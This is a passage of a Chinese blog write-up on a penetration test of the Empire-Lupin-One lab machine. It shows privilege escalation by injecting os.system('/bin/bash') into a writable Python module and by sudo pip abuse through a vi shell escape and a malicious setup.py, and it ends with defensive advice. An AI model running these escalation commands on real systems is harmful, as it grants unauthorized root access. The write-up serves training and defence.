<code>webbrowser.py</code><br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127163436.png)<br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127163525.png)<br>可以看到模块有导入<code>os</code>模块<br>对比两个文件权限，可以发现<code>webbrowser.py</code>任何用户具备可读可写可执行权限<br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127163709.png)<br>修改 <code>webbrower.py</code>，添加以下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.system (&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure>
+<p>执行以下命令切换 shell: <code>sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py</code><br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127164543.png)<br>成功切换</p>
+<h2 id="使用-sudo-程序提权"><a href="#使用-sudo-程序提权" class="headerlink" title="使用 sudo 程序提权"></a>使用 sudo 程序提权</h2><p>执行命令：<code>sudo -l</code><br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127165438.png)<br>发现可以使用pip<br>访问：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/%EF%BC%8C%E6%9F%A5%E8%AF%A2">https://gtfobins.github.io/，查询</a> pip<br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127171235.png)<br>还没搞懂怎么用，后面抽个时间研究一下</p>
+<h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>这里可以用编辑器提权<br>这是另一种利用 <code>pip config</code> 的方式，通过调用系统的 vi 编辑器来获取 Root。<br><code>sudo /usr/bin/pip config edit --editor /usr/bin/vi</code><br>进入编辑界面后按<code>Esc</code><br>输入：<code>:!/bin/sh</code><br>回车之后就可以拿到root权限了<br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127171750.png)</p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>根据GTFOBins上的代码直接执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line">echo &#x27;import os; os.system(&quot;exec /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty&quot;)&#x27; &gt; $TF/setup.py</span><br><span class="line">sudo pip install $TF</span><br></pre></td></tr></table></figure>
+<p>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127173134.png)</p>
+<h3 id="方法二命令解析"><a href="#方法二命令解析" class="headerlink" title="方法二命令解析"></a>方法二命令解析</h3><p>这段代码是一个典型的 <strong>Linux 提权（Privilege Escalation）</strong> 或 <strong>获取 Root Shell</strong> 的技巧。它利用了 <code>pip</code>（Python 包管理器）在安装本地包时会执行 <code>setup.py</code> 脚本的特性，结合 <code>sudo</code> 权限来获取最高权限的交互式 Shell。</p>
+<p>以下是该命令的详细解析和原理分析：</p>
+<h4 id="1-命令分步解析"><a href="#1-命令分步解析" class="headerlink" title="1. 命令分步解析"></a>1. 命令分步解析</h4><ul>
+<li><p><strong><code>TF=$(mktemp -d)</code></strong></p>
+<ul>
+<li><strong>作用</strong>：创建一个临时目录，并将路径存入变量 <code>TF</code>。</li>
+<li><strong>原理</strong>：为了不留下痕迹或干扰现有文件，攻击者通常在 <code>/tmp</code> 下创建一个随机命名的文件夹。</li>
+</ul>
+</li>
+<li><p><strong><code>echo &#39;import os; os.system(&quot;exec /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty&quot;)&#39; &gt; $TF/setup.py</code></strong></p>
+<ul>
+<li><strong>作用</strong>：在临时目录下创建一个名为 <code>setup.py</code> 的文件，内容是一段恶意 Python 代码。</li>
+<li><strong>核心代码分析</strong>：<ul>
+<li><code>import os; os.system(...)</code>：调用系统命令。</li>
+<li><code>exec /bin/sh</code>：使用 <code>/bin/sh</code> 替换当前的 Python 进程（如果直接运行 <code>/bin/sh</code> 只是开子进程，<code>exec</code> 则是彻底接管）。</li>
+<li><code>&lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty</code>：<strong>这是关键点</strong>。它将标准输入 (0)、标准输出 (1) 和标准错误 (2) 全部重定向到当前的控制终端（<code>/dev/tty</code>）。如果没有这一步，Shell 可能会因为没有输入输出流而立即退出，或者无法交互。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong><code>sudo pip install $TF</code></strong></p>
+<ul>
+<li><strong>作用</strong>：以 root 权限运行 <code>pip</code> 来安装位于 <code>$TF</code> 目录下的“包”。</li>
+<li><strong>触发点</strong>：当 <code>pip</code> 安装一个包含 <code>setup.py</code> 的本地源码包时，它必须运行这个 <code>setup.py</code> 来获取包的元数据（如版本、依赖等）或执行构建逻辑。</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-核心原理"><a href="#2-核心原理" class="headerlink" title="2. 核心原理"></a>2. 核心原理</h4><p>这个操作利用了 <strong>Python 打包机制的设计特性</strong>：</p>
+<ol>
+<li><strong>代码执行特性</strong>：<code>setup.py</code> 本质上是一个普通的 Python 脚本。尽管它的初衷是配置安装信息，但 Python 解释器在加载它时会执行其中的所有顶级代码。</li>
+<li><strong>信任边界打破</strong>：当你使用 <code>sudo pip</code> 时，你赋予了 <code>pip</code> 进程 root 权限。由于 <code>pip</code> 必须运行 <code>setup.py</code> 才能完成安装，这就意味着 <code>setup.py</code> 中的任何代码（包括我们的恶意代码）都会以 <strong>root 用户身份执行</strong>。</li>
+<li><strong>进程替换</strong>：通过 <code>os.system(&quot;exec /bin/sh...&quot;)</code>，原本属于 <code>pip</code> 的高权限进程被替换成了一个新的 Shell 进程。</li>
+</ol>
+<h4 id="3-为什么能成功提权？"><a href="#3-为什么能成功提权？" class="headerlink" title="3. 为什么能成功提权？"></a>3. 为什么能成功提权？</h4><p>如果当前用户在 <code>/etc/sudoers</code> 中被允许以 <code>sudo</code> 运行 <code>pip</code> 而无需密码（或者知道密码），那么执行上述命令后：</p>
+<ol>
+<li><code>pip</code> 以 root 身份启动。</li>
+<li><code>pip</code> 读取 <code>$TF/setup.py</code>。</li>
+<li><code>setup.py</code> 中的 <code>exec /bin/sh</code> 被触发。</li>
+<li>用户瞬间获得了一个 root 权限的交互式 Shell。</li>
+</ol>
+<h4 id="4-安全启示"><a href="#4-安全启示" class="headerlink" title="4. 安全启示"></a>4. 安全启示</h4><ul>
+<li><strong>不要轻易给 <code>pip</code> sudo 权限</strong>：在生产环境中，应尽量使用 <code>pip install --user</code> 或虚拟环境（venv），避免给包管理工具系统级的 root 权限。</li>
+<li><strong>GTFOBins 意识</strong>：在渗透测试和安全防御领域，这类利用已知二进制文件（如 <code>pip</code>, <code>find</code>, <code>vim</code> 等）提权的方法被称为 <strong>GTFOBins</strong>。<code>pip</code> 是其中非常著名的一个提权路径。</li>
+<li><strong>审计 Sudoers</strong>：系统管理员应严格限制 sudo 权限，不要随便给具有“执行脚本”或“安装功能”的二进制文件赋予免密或全局 sudo 权限。</li>
+</ul>
+<p><strong>总结</strong>：这是一段利用 <code>pip</code> 安装机制来“劫持” root 进程并将其转换为交互式 Shell 的恶意代码。</p>
+
+    </div>
+  </article>
+  <div class="ccbyncsa">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="copyright">
+                    <div class="author">
+                        <p>作者</p>
+                        <p>woejk0x</p>
+                    </div>
+                    <div class="title">
+                        <p>标题</p>
+                        <p>对01-Empire-Lupin-One的渗透测试</p>
+                    </div>
+                        <div class="publish">
+                            <p>发布于</p>
+                            <p>2026-01-27</p>
+                        </div>
+                    <div class="ccbyncsa-icon">
+                        <p>授权协议</p>
+                        <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                        <p class="ccbyncsa-icon-imgs" style="display: flex;">
+                        <img src="/images/cc.svg" alt="cc">
+                        <img src="/images/by.svg" alt="by">
+                        <img src="/images/nc.svg" alt="nc">
+                        <img src="/images/sa.svg" alt="sa">
+                        </p>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+  <nav class="post-pagination">
+    
+      <div class="post-prev">
+        <span class="nav-label">上一篇</span>
+        <a href="/2026/01/26/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">对02-Breakout的渗透测试</a>
+      </div>
+    
+    
+  </nav>
+  
+
+</div>
+
+<script src="/js/copy.js"></script>
+
+<aside class="sidebar-container sidebar-right">
+    <div class="sidebar-bg">
+        <p id="date"></p>
+<script>
+  function updateDate() {
+    var now = new Date();
+    var dateString = now.toISOString().slice(0, 10);
+    document.getElementById('date').textContent = dateString;
+  }
+
+  window.addEventListener('load', function() {
+    updateDate();
+    // 更新频率为每5分钟更新一次，减少不必要的更新
+    setInterval(updateDate, 300000);
+  });
+</script>
+        <span id="clock" role="timer" aria-live="polite"></span>
+
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const clockElement = document.getElementById('clock');
+    let timerInterval;
+
+    // 格式化时间函数
+    function formatTime(unit) {
+      return unit < 10 ? '0' + unit : unit;
+    }
+
+    // 更新时钟 - 包含秒
+    function updateClock() {
+      const now = new Date();
+      const hours = formatTime(now.getHours());
+      const minutes = formatTime(now.getMinutes());
+      const seconds = formatTime(now.getSeconds());
+      clockElement.textContent = `${hours}:${minutes}:${seconds}`;
+    }
+
+    // 初始化时钟
+    function startClock() {
+      // 立即更新一次时间
+      updateClock();
+      // 每秒更新一次
+      timerInterval = setInterval(updateClock, 1000);
+    }
+
+    // 页面可见性变化时的优化
+    document.addEventListener('visibilitychange', function() {
+      if (document.hidden) {
+        // 页面不可见时停止更新
+        clearInterval(timerInterval);
+      } else {
+        // 页面重新可见时，重新开始
+        clearInterval(timerInterval);
+        startClock();
+      }
+    });
+
+    // 启动时钟
+    startClock();
+  });
+</script>
+
+
+    </div>
+    <div class="sidebar-bg">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">主机发现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E4%B8%80"><span class="toc-number">1.1.1.</span> <span class="toc-text">命令一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E4%BA%8C"><span class="toc-number">1.1.2.</span> <span class="toc-text">命令二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E4%B8%89"><span class="toc-number">1.1.3.</span> <span class="toc-text">命令三</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.</span> <span class="toc-text">目录扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E4%B8%80-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">命令一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E4%BA%8C-1"><span class="toc-number">1.3.2.</span> <span class="toc-text">命令二</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞发现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3-sshkey-%E5%AF%86%E7%A0%81-getshell"><span class="toc-number">3.1.</span> <span class="toc-text">破解 sshkey 密码 getshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE-suid-%E6%9D%83%E9%99%90%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83"><span class="toc-number">4.1.</span> <span class="toc-text">寻找 suid 权限程序提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-sudo-%E7%A8%8B%E5%BA%8F%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7-arsene-%E7%9A%84-shell"><span class="toc-number">4.2.</span> <span class="toc-text">使用 sudo 程序获取用户 arsene 的 shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-sudo-%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83"><span class="toc-number">4.3.</span> <span class="toc-text">使用 sudo 程序提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">4.3.1.</span> <span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">4.3.2.</span> <span class="toc-text">方法二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%E5%91%BD%E4%BB%A4%E8%A7%A3%E6%9E%90"><span class="toc-number">4.3.3.</span> <span class="toc-text">方法二命令解析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%91%BD%E4%BB%A4%E5%88%86%E6%AD%A5%E8%A7%A3%E6%9E%90"><span class="toc-number">4.3.3.1.</span> <span class="toc-text">1. 命令分步解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">4.3.3.2.</span> <span class="toc-text">2. 核心原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E6%88%90%E5%8A%9F%E6%8F%90%E6%9D%83%EF%BC%9F"><span class="toc-number">4.3.3.3.</span> <span class="toc-text">3. 为什么能成功提权？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%AE%89%E5%85%A8%E5%90%AF%E7%A4%BA"><span class="toc-number">4.3.3.4.</span> <span class="toc-text">4. 安全启示</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+    <div class="sidebar-bg">
+        <div class="card-tags">
+            
+                <a href="/tags/%E6%A8%A1%E6%8B%9F/" class="tag" aria-label="标签: #模拟">#模拟</a>
+            
+                <a href="/tags/Medium/" class="tag" aria-label="标签: #Medium">#Medium</a>
+            
+        </div>
+    </div>
+    <div>
+        <div class="categories-list">
+            
+                <div class="category-item">
+                    <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" aria-label="分类: 内网渗透">
+                        内网渗透
+                        <span>(7)</span>
+                    </a>
+                </div>
+            
+                <div class="category-item">
+                    <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E6%97%A5%E8%AE%B0/" aria-label="分类: 靶机日记">
+                        靶机日记
+                        <span>(7)</span>
+                    </a>
+                </div>
+            
+        </div>
+    </div>
+</aside>
+
+    <!-- No categories available -->
+
+
+    <footer>
+    <span id="busuanzi_container_site_pv" style="display: inline;"></span>
+    <span>👁<span id="busuanzi_value_site_pv"></span></span>
+    <div class="padding border border-sub border-dotted fadein-right">
+        <span style="color:aliceblue">👤<span id="busuanzi_value_site_uv"></span></span>
+    </div>
+    <span>
+        由 <a target="_blank" rel="noopener" href="https://hexo.io" alt="Hexo">
+            <p class="hover-underline night" style="display: inline;">Hexo</p>
+        </a> 驱动
+        <p style="display: inline; color: red;">❤</p>
+        <a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang" alt="Wang">
+            <p class="hover-underline night" style="display: inline;">Wang</p>
+        </a> 主题构建
+    </span>
+
+    <!-- 带图片的链接 -->
+    <div class="footer-links">
+        
+    </div>
+
+    <!-- 纯文本链接 -->
+    <div class="footer-text-links">
+        
+    </div>
+</footer>
+    
+<script src="/js/background.js"></script>
+    
+</main>
+</body>
+</html>
